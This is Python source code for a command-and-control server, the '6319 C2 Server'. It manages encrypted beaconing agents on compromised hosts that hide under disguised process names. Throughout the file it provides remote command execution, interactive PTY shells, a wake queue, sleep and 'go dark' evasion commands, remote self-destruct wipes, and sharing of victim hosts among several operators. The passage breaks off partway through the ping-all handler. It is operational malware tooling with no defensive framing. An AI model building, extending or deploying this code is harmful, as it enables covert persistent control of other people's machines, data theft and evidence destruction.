#!/usr/bin/env python3
"""
6319 C2 Server v3.2 - Multi-Channel
Features:
- Multi-channel: STEALTH + PERSIST from same host
- Beacon mode: agents connect briefly, check for work, disconnect
- Wake queue: commands queued until agent checks in
- Connect/Disconnect on demand
- Sleep/Go Dark commands
- Self-destruct remote wipe
- Ping all (cached, no network)
- Full PTY terminal support
- Grouped hosts API with channel selector UI
"""

import socket
import threading
import json
import time
import os
import secrets
import uuid
import queue
import hashlib
import string
import random
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template, jsonify, request, Response, send_file, redirect, url_for, session, make_response

from crypto import SecureChannel, generate_secret, verify_secret
from webhooks import WebhookNotifier

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SESSION_SECRET', secrets.token_hex(32))

from flask_socketio import SocketIO, emit
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=120, ping_interval=25)

C2_SOCKET_PORT = int(os.environ.get('C2_SOCKET_PORT', 6318))
C2_WEB_PORT = int(os.environ.get('C2_WEB_PORT', 5000))
SERVER_IP = None

STEALTH_PATH = os.environ.get('STEALTH_PATH', 'stealth')
PERSIST_PATH = os.environ.get('PERSIST_PATH', 'x')
LOGIN_PATH = os.environ.get('LOGIN_PATH', '')
DASHBOARD_PATH = os.environ.get('DASHBOARD_PATH', '')
AUTH_KEY = os.environ.get('AUTH_KEY', '')

app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'None'
app.config['SESSION_COOKIE_SECURE'] = True

def generate_random_path(length=26):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not AUTH_KEY:
            return f(*args, **kwargs)
        if not session.get('authenticated'):
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized'}), 401
            login_url = f'/{LOGIN_PATH}' if LOGIN_PATH else '/login'
            return redirect(login_url)
        return f(*args, **kwargs)
    return decorated


def detect_server_ip():
    global SERVER_IP
    if os.environ.get('C2_IP'):
        SERVER_IP = os.environ.get('C2_IP')
        return SERVER_IP
    if os.environ.get('REPLIT_DEV_DOMAIN'):
        SERVER_IP = os.environ.get('REPLIT_DEV_DOMAIN')
        return SERVER_IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        SERVER_IP = s.getsockname()[0]
        s.close()
        return SERVER_IP
    except:
        pass
    try:
        import urllib.request
        SERVER_IP = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode()
        return SERVER_IP
    except:
        pass
    SERVER_IP = 'localhost'
    return SERVER_IP


def is_replit_domain():
    return '.replit.dev' in (SERVER_IP or '')


clients = {}
clients_lock = threading.Lock()
wake_queue = {}
wake_queue_lock = threading.Lock()
command_results = {}
pty_sessions = {}
pty_sessions_lock = threading.Lock()
notifier = WebhookNotifier()

# User management
USERS_FILE = os.path.join(os.path.dirname(__file__), 'users.json')
users = {}  # {user_id: user_data}
users_lock = threading.Lock()

def generate_user_id():
    return secrets.token_hex(8)

def load_users():
    global users
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                users = json.load(f)
    except:
        users = {}

def save_users():
    with users_lock:
        try:
            with open(USERS_FILE, 'w') as f:
                json.dump(users, f, indent=2)
        except:
            pass

def get_used_ports():
    """Get list of ports already used by users"""
    used = set()
    with users_lock:
        for u in users.values():
            if 'port' in u:
                used.add(u['port'])
    return used

def generate_user_port():
    """Generate random port 5000-9000 not already used"""
    used = get_used_ports()
    available = [p for p in range(5000, 9001) if p not in used and p != 5000 and p != 6318]
    return random.choice(available) if available else random.randint(5001, 9000)

def create_user(name):
    """Create a new user with unique paths, port and key"""
    user_id = generate_user_id()
    user = {
        'id': user_id,
        'name': name,
        'key': ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*()_+-=[]{}|;:,.<>?', k=40)),
        'port': generate_user_port(),
        'stealth_path': generate_random_path(9),
        'persist_path': generate_random_path(9),
        'shared_hosts': [],
        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    with users_lock:
        users[user_id] = user
    save_users()
    return user

def get_user(user_id):
    with users_lock:
        return users.get(user_id)

def delete_user(user_id):
    with users_lock:
        if user_id in users:
            del users[user_id]
    save_users()

def is_admin_session():
    """Check if current session is admin (main profile)"""
    # If no AUTH_KEY, everyone is admin (no auth required)
    if not AUTH_KEY:
        return True
    return session.get('is_admin', False)

def get_current_user_id():
    """Get current user ID being viewed (for filtering)"""
    return session.get('view_as_user')

def get_viewing_user():
    """Get user object being viewed"""
    view_id = session.get('view_as_user')
    if view_id:
        return get_user(view_id)
    return None

def get_accessible_clients(user_id=None):
    """Get list of client_ids accessible to user"""
    # Use view_as_user if set, otherwise the provided user_id
    view_id = session.get('view_as_user') if user_id is None else user_id
    if view_id is None:
        return None  # Admin sees all when not viewing as user
    user = get_user(view_id)
    if user:
        return set(user.get('shared_hosts', []))
    return set()

def share_host(user_id, client_id):
    """Share a host with a user"""
    with users_lock:
        if user_id in users:
            if client_id not in users[user_id]['shared_hosts']:
                users[user_id]['shared_hosts'].append(client_id)
    save_users()

def unshare_host(user_id, client_id):
    """Remove host share from user"""
    with users_lock:
        if user_id in users:
            if client_id in users[user_id]['shared_hosts']:
                users[user_id]['shared_hosts'].remove(client_id)
    save_users()

def get_host_shares(client_id):
    """Get list of users who have access to this host"""
    shares = []
    with users_lock:
        for uid, user in users.items():
            if client_id in user.get('shared_hosts', []):
                shares.append({'id': uid, 'name': user['name']})
    return shares

# Load users on startup
load_users()


class Client:
    def __init__(self, conn, addr, client_id, secret):
        self.conn = conn
        self.addr = addr
        self.id = client_id
        self.secret = secret
        self.channel = SecureChannel(secret)
        self.hostname = "unknown"
        self.os_info = "unknown"
        self.user = "unknown"
        self.arch = "unknown"
        self.pid = 0
        self.hidden_name = ""
        self.pty_support = False
        self.beacon_mode = True
        self.agent_channel = "stealth"
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.last_beacon = datetime.now()
        self.alive = True
        self.online = False
        self.pty_sessions = set()
        self._send_lock = threading.Lock()
        self.send_queue = queue.Queue()
        self.pending_exec = {}
        self.exec_counter = 0
        self.status = 'sleeping'
        
    def to_dict(self):
        now = datetime.now()
        last_seen_seconds = (now - self.last_seen).total_seconds()
        
        if self.online:
            status = 'online'
        elif last_seen_seconds < 600:
            status = 'beacon'
        elif last_seen_seconds < 3600:
            status = 'sleeping'
        else:
            status = 'dark'
        
        return {
            'id': self.id,
            'secret': self.secret[:8] + '...' if self.secret else '',
            'ip': self.addr[0],
            'port': self.addr[1],
            'hostname': self.hostname,
            'os': self.os_info,
            'user': self.user,
            'arch': self.arch,
            'pid': self.pid,
            'hidden_as': self.hidden_name,
            'pty_support': self.pty_support,
            'beacon_mode': self.beacon_mode,
            'channel': self.agent_channel,
            'connected_at': self.connected_at.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen_ago': f'{int(last_seen_seconds)}s ago' if last_seen_seconds < 60 else f'{int(last_seen_seconds/60)}m ago',
            'alive': self.alive,
            'online': self.online,
            'status': status,
            'uptime': str(now - self.connected_at).split('.')[0],
            'encrypted': True
        }

    def send(self, data):
        with self._send_lock:
            try:
                frame = self.channel.encrypt_frame(data)
                self.conn.sendall(frame)
                return True
            except:
                self.alive = False
                return False
    
    def queue_send(self, data):
        self.send_queue.put(data)
    
    def recv_frame(self):
        try:
            lb = b''
            while len(lb) < 4:
                c = self.conn.recv(4 - len(lb))
                if not c:
                    return None
                lb += c
            length = int.from_bytes(lb, 'big')
            if length > 10 * 1024 * 1024:
                return None
            data = b''
            while len(data) < length:
                c = self.conn.recv(min(8192, length - len(data)))
                if not c:
                    return None
                data += c
            self.last_seen = datetime.now()
            return self.channel.decrypt(data)
        except socket.timeout:
            return "timeout"
        except:
            return None


def get_client_key(addr, hostname, channel='stealth'):
    """Generate stable client key based on IP + hostname + channel"""
    return hashlib.md5(f"{addr[0]}:{hostname}:{channel}".encode()).hexdigest()[:12]


def client_sender_thread(client):
    while client.alive and client.online:
        try:
            data = client.send_queue.get(timeout=0.5)
            if data is None:
                break
            client.send(data)
        except queue.Empty:
            pass
        except:
            client.alive = False
            break


def client_reader_thread(client, client_id):
    while client.alive and client.online:
        try:
            client.conn.settimeout(1.0)
            msg = client.recv_frame()
            
            if msg is None:
                client.online = False
                break
            
            if msg == "timeout":
                continue
            
            msg_type = msg.get('type', msg.get('status', ''))
            
            if msg_type == 'pong' or msg.get('status') == 'pong':
                continue
            
            elif msg_type == 'pty_data':
                session_id = msg.get('session_id')
                data = msg.get('data', '')
                with pty_sessions_lock:
                    if session_id in pty_sessions:
                        ws_sid = pty_sessions[session_id].get('ws_sid')
                        if ws_sid:
                            socketio.emit('pty_output', {'session_id': session_id, 'data': data}, to=ws_sid)
            
            elif msg_type == 'pty_opened':
                session_id = msg.get('session_id')
                with pty_sessions_lock:
                    if session_id in pty_sessions:
                        ws_sid = pty_sessions[session_id].get('ws_sid')
                        if ws_sid:
                            socketio.emit('pty_ready', {'session_id': session_id}, to=ws_sid)
            
            elif msg_type == 'pty_exit':
                session_id = msg.get('session_id')
                code = msg.get('code', -1)
                with pty_sessions_lock:
                    if session_id in pty_sessions:
                        ws_sid = pty_sessions[session_id].get('ws_sid')
                        if ws_sid:
                            socketio.emit('pty_closed', {'session_id': session_id, 'code': code}, to=ws_sid)
                        del pty_sessions[session_id]
                client.pty_sessions.discard(session_id)
            
            elif msg_type == 'file_op_result':
                op_id = msg.get('op_id')
                if op_id:
                    with file_op_lock:
                        file_op_results[op_id] = msg
            
            elif msg.get('status') in ['sleeping', 'going_dark', 'destroying', 'disconnected']:
                client.online = False
                if msg.get('status') == 'destroying':
                    client.alive = False
                print(f"[-] Agent {client.hostname}: {msg.get('status')}")
                break
            
            else:
                if 'stdout' in msg or 'stderr' in msg or 'error' in msg or 'code' in msg:
                    if client_id not in command_results:
                        command_results[client_id] = []
                    cmd_id = client.exec_counter - 1
                    cmd_text = client.pending_exec.pop(cmd_id, 'unknown')
                    command_results[client_id].append({
                        'cmd': {'data': cmd_text},
                        'result': msg,
                        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    })
                    
        except:
            break
    
    client.online = False
    cleanup_client_pty_sessions(client_id)


def cleanup_client_pty_sessions(client_id):
    with pty_sessions_lock:
        to_remove = [sid for sid, info in pty_sessions.items() if info.get('client_id') == client_id]
        for sid in to_remove:
            ws_sid = pty_sessions[sid].get('ws_sid')
            if ws_sid:
                socketio.emit('pty_closed', {'session_id': sid, 'code': -1}, to=ws_sid)
            del pty_sessions[sid]


def ping_thread(client):
    while client.alive and client.online:
        time.sleep(15)
        if client.alive and client.online:
            client.queue_send({'cmd': 'ping'})


def handle_beacon(conn, addr, secret, crypto_channel, info):
    """Handle beacon check-in: quick connect, check queue, respond, disconnect"""
    hostname = info.get('hostname', 'unknown')
    agent_channel = info.get('channel', 'stealth')
    client_key = get_client_key(addr, hostname, agent_channel)
    
    with clients_lock:
        if client_key in clients:
            client = clients[client_key]
            client.last_seen = datetime.now()
            client.last_beacon = datetime.now()
            client.conn = conn
            client.channel = crypto_channel
            client.secret = secret
            client.hidden_name = info.get('hidden_name', client.hidden_name)
        else:
            client = Client(conn, addr, client_key, secret)
            client.hostname = hostname
            client.os_info = info.get('os', 'unknown')
            client.user = info.get('user', 'unknown')
            client.arch = info.get('arch', 'unknown')
            client.pid = info.get('pid', 0)
            client.hidden_name = info.get('hidden_name', '')
            client.pty_support = info.get('pty_support', False)
            client.beacon_mode = info.get('beacon_mode', True)
            client.agent_channel = agent_channel
            clients[client_key] = client
            
            print(f"[+] New beacon: {client.hostname} ({client.os_info}) - {client.user}")
            
            if notifier.is_configured():
                threading.Thread(target=notifier.notify_agent_connected, args=({
                    'hostname': client.hostname,
                    'os': client.os_info,
                    'user': client.user,
                    'ip': addr[0]
                },), daemon=True).start()
    
    with wake_queue_lock:
        has_work = client_key in wake_queue and len(wake_queue[client_key]) > 0
        sleep_override = 0
        pending_commands = []
        
        if has_work:
            for cmd in wake_queue[client_key]:
                cmd_type = cmd.get('type', '')
                if cmd_type == 'sleep':
                    minutes = cmd.get('minutes', 60)
                    sleep_override = minutes * 60
                    pending_commands.append({'type': 'sleep', 'seconds': sleep_override})
                    print(f"[*] Sending sleep ({minutes}m) to beacon: {client.hostname}")
                elif cmd_type == 'go_dark':
                    hours = cmd.get('hours', 24)
                    sleep_override = hours * 3600
                    pending_commands.append({'type': 'go_dark', 'seconds': sleep_override})
                    print(f"[*] Sending go_dark ({hours}h) to beacon: {client.hostname}")
                elif cmd_type == 'self_destruct':
                    pending_commands.append({'type': 'self_destruct'})
                    print(f"[!] Sending self_destruct to beacon: {client.hostname}")
                elif cmd_type == 'wake':
                    pending_commands.append({'type': 'connect_now'})
                    print(f"[*] Sending connect_now to beacon: {client.hostname}")
            wake_queue[client_key] = []
    
    response = {'status': 'ok', 'id': client_key, 'has_work': has_work, 'sleep': sleep_override}
    if pending_commands:
        response['commands'] = pending_commands
    
    client.send(response)
    conn.close()
    
    print(f"[*] Beacon from {client.hostname}: has_work={has_work}, commands={len(pending_commands)}")


def handle_interactive(conn, addr, secret, crypto_channel, info):
    """Handle full interactive session"""
    hostname = info.get('hostname', 'unknown')
    agent_channel = info.get('channel', 'stealth')
    client_key = get_client_key(addr, hostname, agent_channel)
    
    with clients_lock:
        if client_key in clients:
            client = clients[client_key]
            client.conn = conn
            client.channel = crypto_channel
            client.secret = secret
            client.last_seen = datetime.now()
            client.online = True
            client.alive = True
            client.hidden_name = info.get('hidden_name', client.hidden_name)
        else:
            client = Client(conn, addr, client_key, secret)
            client.hostname = hostname
            client.os_info = info.get('os', 'unknown')
            client.user = info.get('user', 'unknown')
            client.arch = info.get('arch', 'unknown')
            client.pid = info.get('pid', 0)
            client.hidden_name = info.get('hidden_name', '')
            client.pty_support = info.get('pty_support', False)
            client.beacon_mode = info.get('beacon_mode', True)
            client.agent_channel = agent_channel
            client.online = True
            clients[client_key] = client
    
    print(f"[+] Interactive session: {client.hostname} ({client.os_info})")
    
    client.send({'status': 'ok', 'id': client_key})
    
    with wake_queue_lock:
        if client_key in wake_queue:
            for cmd in wake_queue[client_key]:
                client.queue_send(cmd)
            wake_queue[client_key] = []
    
    sender = threading.Thread(target=client_sender_thread, args=(client,), daemon=True)
    reader = threading.Thread(target=client_reader_thread, args=(client, client_key), daemon=True)
    pinger = threading.Thread(target=ping_thread, args=(client,), daemon=True)
    
    sender.start()
    reader.start()
    pinger.start()
    
    reader.join()
    
    client.online = False
    client.send_queue.put(None)
    
    try:
        conn.close()
    except:
        pass
    
    print(f"[-] Session ended: {client.hostname}")


def handle_client(conn, addr):
    conn.settimeout(30)
    
    try:
        lb = conn.recv(4)
        if len(lb) < 4:
            conn.close()
            return
        length = int.from_bytes(lb, 'big')
        if length > 65536:
            conn.close()
            return
        data = b''
        while len(data) < length:
            c = conn.recv(min(4096, length - len(data)))
            if not c:
                conn.close()
                return
            data += c
        
        init = json.loads(data.decode())
        secret = init.get('secret', '')
        mode = init.get('mode', 'interactive')
        
        if not verify_secret(secret):
            conn.close()
            return
        
        channel = SecureChannel(secret)
        
    except Exception as e:
        conn.close()
        return
    
    try:
        enc_info = b''
        lb = conn.recv(4)
        if len(lb) < 4:
            conn.close()
            return
        info_len = int.from_bytes(lb, 'big')
        while len(enc_info) < info_len:
            c = conn.recv(min(4096, info_len - len(enc_info)))
            if not c:
                conn.close()
                return
            enc_info += c
        info = channel.decrypt(enc_info)
        if not info:
            conn.close()
            return
        
    except:
        conn.close()
        return
    
    if mode == 'beacon':
        handle_beacon(conn, addr, secret, channel, info)
    else:
        handle_interactive(conn, addr, secret, channel, info)


def socket_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', C2_SOCKET_PORT))
    server.listen(100)
    
    print(f"[*] C2 Socket listening on port {C2_SOCKET_PORT} (encrypted)")
    
    while True:
        try:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except Exception as e:
            print(f"[-] Socket error: {e}")


@socketio.on('connect')
def ws_connect():
    print(f"[WS] Client connected: {request.sid}")


@socketio.on('disconnect')
def ws_disconnect():
    sid = request.sid
    with pty_sessions_lock:
        to_close = [(session_id, info) for session_id, info in pty_sessions.items() if info.get('ws_sid') == sid]
    
    for session_id, info in to_close:
        client_id = info.get('client_id')
        with clients_lock:
            if client_id in clients and clients[client_id].online:
                clients[client_id].queue_send({'type': 'pty_close', 'session_id': session_id})
                clients[client_id].pty_sessions.discard(session_id)
        
        with pty_sessions_lock:
            if session_id in pty_sessions:
                del pty_sessions[session_id]
    
    print(f"[WS] Client disconnected: {sid}")


@socketio.on('pty_open')
def ws_pty_open(data):
    client_id = data.get('client_id')
    cols = data.get('cols', 80)
    rows = data.get('rows', 24)
    
    with clients_lock:
        if client_id not in clients:
            emit('error', {'message': 'Client not found'})
            return
        
        client = clients[client_id]
        if not client.online:
            emit('error', {'message': 'Client offline - queue connect first'})
            return
        
        if not client.pty_support:
            emit('error', {'message': 'Client does not support PTY'})
            return
        
        session_id = str(uuid.uuid4())[:8]
        
        with pty_sessions_lock:
            pty_sessions[session_id] = {
                'client_id': client_id,
                'ws_sid': request.sid,
                'cols': cols,
                'rows': rows
            }
        client.pty_sessions.add(session_id)
        
        client.queue_send({
            'type': 'pty_open',
            'session_id': session_id,
            'cols': cols,
            'rows': rows
        })
    
    emit('pty_opening', {'session_id': session_id})


@socketio.on('pty_input')
def ws_pty_input(data):
    session_id = data.get('session_id')
    input_data = data.get('data', '')
    
    with pty_sessions_lock:
        if session_id not in pty_sessions:
            return
        client_id = pty_sessions[session_id].get('client_id')
    
    with clients_lock:
        if client_id in clients and clients[client_id].online:
            clients[client_id].queue_send({
                'type': 'pty_data',
                'session_id': session_id,
                'data': input_data
            })


@socketio.on('pty_resize')
def ws_pty_resize(data):
    session_id = data.get('session_id')
    cols = data.get('cols', 80)
    rows = data.get('rows', 24)
    
    with pty_sessions_lock:
        if session_id not in pty_sessions:
            return
        pty_sessions[session_id]['cols'] = cols
        pty_sessions[session_id]['rows'] = rows
        client_id = pty_sessions[session_id].get('client_id')
    
    with clients_lock:
        if client_id in clients and clients[client_id].online:
            clients[client_id].queue_send({
                'type': 'pty_resize',
                'session_id': session_id,
                'cols': cols,
                'rows': rows
            })


@socketio.on('pty_close')
def ws_pty_close(data):
    session_id = data.get('session_id')
    
    with pty_sessions_lock:
        if session_id not in pty_sessions:
            return
        client_id = pty_sessions[session_id].get('client_id')
        del pty_sessions[session_id]
    
    with clients_lock:
        if client_id in clients and clients[client_id].online:
            clients[client_id].queue_send({'type': 'pty_close', 'session_id': session_id})
            clients[client_id].pty_sessions.discard(session_id)


def get_server_url():
    if os.environ.get('C2_URL'):
        return os.environ.get('C2_URL')
    ip = SERVER_IP or detect_server_ip()
    if is_replit_domain():
        return f'https://{ip}'
    return f'http://{ip}:{C2_WEB_PORT}'


def get_c2_host():
    if os.environ.get('C2_HOST'):
        return os.environ.get('C2_HOST')
    return SERVER_IP or detect_server_ip()


def login_page_handler():
    if not AUTH_KEY:
        dashboard_url = f'/{DASHBOARD_PATH}' if DASHBOARD_PATH else '/'
        return redirect(dashboard_url)
    
    error = None
    if request.method == 'POST':
        key = request.form.get('key', '')
        if key == AUTH_KEY:
            session['authenticated'] = True
            session.permanent = True
            dashboard_url = f'/{DASHBOARD_PATH}' if DASHBOARD_PATH else '/'
            return redirect(dashboard_url)
        error = 'Invalid key'
    
    return render_template('login.html', error=error)


def logout_handler():
    session.pop('authenticated', None)
    login_url = f'/{LOGIN_PATH}' if LOGIN_PATH else '/login'
    return redirect(login_url)


@require_auth
def dashboard_handler():
    return render_template('index.html')


def root_redirect():
    if DASHBOARD_PATH:
        return '', 404
    return dashboard_handler()


@app.route('/api/clients')
@require_auth
def api_clients():
    """Return hosts grouped by hostname, each with available channels"""
    # Support view_as query parameter for client-side user switching
    view_as = request.args.get('view_as')
    if view_as and is_admin_session():
        current_user = view_as
    else:
        current_user = get_current_user_id()
    is_admin = is_admin_session()
    accessible = get_accessible_clients(current_user)
    
    with clients_lock:
        # Group clients by IP+hostname
        hosts = {}
        for c in clients.values():
            # Filter by user access
            if accessible is not None and c.id not in accessible:
                continue
            
            host_key = f"{c.addr[0]}:{c.hostname}"
            if host_key not in hosts:
                hosts[host_key] = {
                    'hostname': c.hostname,
                    'ip': c.addr[0],
                    'channels': {}
                }
            # Add channel info
            channel_name = c.agent_channel
            hosts[host_key]['channels'][channel_name] = c.to_dict()
        
        # Convert to list with computed overall status
        result = []
        for host_key, host_data in hosts.items():
            channels = host_data['channels']
            
            # Determine overall status (best of all channels)
            any_online = any(ch['online'] for ch in channels.values())
            
            if any_online:
                overall_status = 'online'
            else:
                # Find best status among channels
                statuses = [ch['status'] for ch in channels.values()]
                if 'beacon' in statuses:
                    overall_status = 'beacon'
                elif 'sleeping' in statuses:
                    overall_status = 'sleeping'
                else:
                    overall_status = 'dark'
            
            # Get most recent last_seen
            best_channel = max(channels.values(), key=lambda x: x['last_seen'])
            
            # Get shares info for admin
            first_channel_id = list(channels.values())[0]['id']
            shares = get_host_shares(first_channel_id) if is_admin else []
            
            result.append({
                'host_key': host_key,
                'hostname': host_data['hostname'],
                'ip': host_data['ip'],
                'channels': channels,
                'channel_list': list(channels.keys()),
                'overall_status': overall_status,
                'overall_online': any_online,
                'last_seen': best_channel['last_seen'],
                'last_seen_ago': best_channel['last_seen_ago'],
                'os': best_channel['os'],
                'user': best_channel['user'],
                'arch': best_channel['arch'],
                'shared_with': shares
            })
        
        return jsonify(sorted(result, key=lambda x: (not x['overall_online'], x['overall_status'] != 'beacon', x['hostname'])))


@app.route('/api/clients/<client_id>/connect', methods=['POST'])
@require_auth
def api_connect(client_id):
    """Queue wake signal - agent will connect on next beacon"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if client.online:
            return jsonify({'status': 'already_online'})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'type': 'wake'})
    
    return jsonify({'status': 'queued', 'message': 'Will connect on next beacon'})


@app.route('/api/clients/<client_id>/disconnect', methods=['POST'])
@require_auth
def api_disconnect(client_id):
    """Disconnect active session"""
    print(f"[*] Disconnect request for: {client_id}")
    with clients_lock:
        if client_id not in clients:
            print(f"[-] Client not found: {client_id}")
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            print(f"[-] Client already offline: {client_id}")
            return jsonify({'status': 'already_offline'})
        print(f"[*] Sending disconnect to: {client.hostname}")
        client.queue_send({'type': 'disconnect'})
    
    return jsonify({'status': 'disconnecting'})


@app.route('/api/clients/<client_id>/sleep', methods=['POST'])
@require_auth
def api_sleep(client_id):
    """Put agent to sleep for specified minutes"""
    minutes = request.json.get('minutes', 60) if request.json else 60
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        
        if client.online:
            client.queue_send({'type': 'sleep', 'minutes': minutes})
            return jsonify({'status': 'sleeping', 'minutes': minutes})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'type': 'sleep', 'minutes': minutes})
    
    return jsonify({'status': 'queued', 'minutes': minutes})


@app.route('/api/clients/<client_id>/dark', methods=['POST'])
@require_auth
def api_go_dark(client_id):
    """Go dark for specified hours (no beacons)"""
    hours = request.json.get('hours', 24) if request.json else 24
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        
        if client.online:
            client.queue_send({'type': 'go_dark', 'hours': hours})
            return jsonify({'status': 'going_dark', 'hours': hours})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'type': 'go_dark', 'hours': hours})
    
    return jsonify({'status': 'queued', 'hours': hours})


@app.route('/api/clients/<client_id>/destroy', methods=['POST'])
@require_auth
def api_destroy(client_id):
    """Self-destruct agent and remove from panel"""
    sent_destroy = False
    was_online = False
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        was_online = client.online
        
        if client.online:
            client.queue_send({'type': 'self_destruct'})
            sent_destroy = True
        
        del clients[client_id]
    
    if was_online:
        with wake_queue_lock:
            if client_id in wake_queue:
                del wake_queue[client_id]
        print(f"[!] Client destroyed (online): {client_id}")
        return jsonify({'status': 'destroyed', 'message': 'Agent wiped and removed from panel'})
    else:
        with wake_queue_lock:
            if client_id not in wake_queue:
                wake_queue[client_id] = []
            wake_queue[client_id] = [{'type': 'self_destruct'}]
        print(f"[!] Client removed, destroy queued: {client_id}")
        return jsonify({'status': 'queued', 'message': 'Removed from panel. Destroy queued for next beacon.'})


# User Management API
@app.route('/api/users')
@require_auth
def api_users():
    """List all users (admin only)"""
    if not is_admin_session():
        return jsonify({'error': 'Admin only'}), 403
    with users_lock:
        return jsonify(list(users.values()))


@app.route('/api/users', methods=['POST'])
@require_auth
def api_create_user():
    """Create a new user (admin only)"""
    if not is_admin_session():
        return jsonify({'error': 'Admin only'}), 403
    data = request.json or {}
    name = data.get('name', f'User_{len(users)+1}')
    user = create_user(name)
    return jsonify(user)


@app.route('/api/users/<user_id>', methods=['DELETE'])
@require_auth
def api_delete_user(user_id):
    """Delete a user (admin only)"""
    if not is_admin_session():
        return jsonify({'error': 'Admin only'}), 403
    delete_user(user_id)
    return jsonify({'status': 'deleted'})


@app.route('/api/users/<user_id>', methods=['PUT'])
@require_auth
def api_update_user(user_id):
    """Update a user (admin only)"""
    if not is_admin_session():
        return jsonify({'error': 'Admin only'}), 403
    data = request.json or {}
    with users_lock:
        if user_id not in users:
            return jsonify({'error': 'User not found'}), 404
        if 'name' in data:
            users[user_id]['name'] = data['name']
        save_users()
    return jsonify({'status': 'updated'})


@app.route('/api/users/<user_id>/share', methods=['POST'])
@require_auth
def api_share_host(user_id):
    """Share a host with user (admin only)"""
    if not is_admin_session():
        return jsonify({'error': 'Admin only'}), 403
    data = request.json or {}
    client_id = data.get('client_id')
    if not client_id:
        return jsonify({'error': 'client_id required'}), 400
    share_host(user_id, client_id)
    return jsonify({'status': 'shared'})


@app.route('/api/users/<user_id>/unshare', methods=['POST'])
@require_auth
def api_unshare_host(user_id):
    """Remove host share from user (admin only)"""
    if not is_admin_session():
        return jsonify({'error': 'Admin only'}), 403
    data = request.json or {}
    client_id = data.get('client_id')
    if not client_id:
        return jsonify({'error': 'client_id required'}), 400
    unshare_host(user_id, client_id)
    return jsonify({'status': 'unshared'})


@app.route('/api/session')
@require_auth
def api_session():
    """Get current session info"""
    view_user = get_viewing_user()
    return jsonify({
        'is_admin': is_admin_session(),
        'view_as_user': session.get('view_as_user'),
        'viewing_user': view_user
    })


@app.route('/api/switch_user', methods=['POST'])
@require_auth
def api_switch_user():
    """Switch to a different user view (admin only)"""
    if not is_admin_session():
        return jsonify({'error': 'Admin only'}), 403
    data = request.json or {}
    user_id = data.get('user_id')
    if user_id == 'admin' or user_id is None:
        session.pop('view_as_user', None)
    else:
        if user_id not in users:
            return jsonify({'error': 'User not found'}), 404
        session['view_as_user'] = user_id
    return jsonify({'status': 'switched', 'view_as_user': session.get('view_as_user')})


@app.route('/api/clients/<client_id>/exec', methods=['POST'])
@require_auth
def api_exec(client_id):
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        
        cmd = request.json.get('cmd', '') if request.json else ''
        if not cmd:
            return jsonify({'error': 'No command'}), 400
        
        if client.online:
            client.pending_exec[client.exec_counter] = cmd
            client.exec_counter += 1
            client.queue_send({'cmd': 'exec', 'data': cmd})
            return jsonify({'status': 'sent'})
    
    with wake_queue_lock:
        if client_id not in wake_queue:
            wake_queue[client_id] = []
        wake_queue[client_id].append({'cmd': 'exec', 'data': cmd})
    
    return jsonify({'status': 'queued'})


@app.route('/api/clients/<client_id>/results')
@require_auth
def api_results(client_id):
    return jsonify(command_results.get(client_id, []))


@app.route('/api/clients/<client_id>/shell')
@require_auth
def api_shell(client_id):
    def generate():
        last = 0
        while True:
            results = command_results.get(client_id, [])
            if len(results) > last:
                for r in results[last:]:
                    yield f"data: {json.dumps(r)}\n\n"
                last = len(results)
            time.sleep(0.5)
    return Response(generate(), mimetype='text/event-stream')


@app.route('/api/ping_all', methods=['POST'])
@require_auth
def api_ping_all():
    """Check all agents status from cache (no network traffic)"""
    now = datetime.now()
    results = []
    
    with clients_lock:
        for cid, client in clients.items():
            last_seen_seconds = (now - client.last_seen).total_seconds()
            results.append({
                'id': cid,
                'hostname': client.hostname,
                'ip': client.addr[0],
                'online': client.online,
                'last_seen': client.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
                'last_seen_ago': f'{int(last_seen_seconds)}s' if last_seen_seconds < 60 else f'{int(last_seen_seconds/60)}m',
                'status': 'online' if client.online else ('beacon' if last_seen_seconds < 600 else ('sleeping' if last_seen_seconds < 3600 else 'dark'))
            })
    
    return jsonify({
        'total': len(results),
        'online': sum(1 for r in results if r['online']),
        'beacon': sum(1 for r in results if r['status'] == 'beacon'),
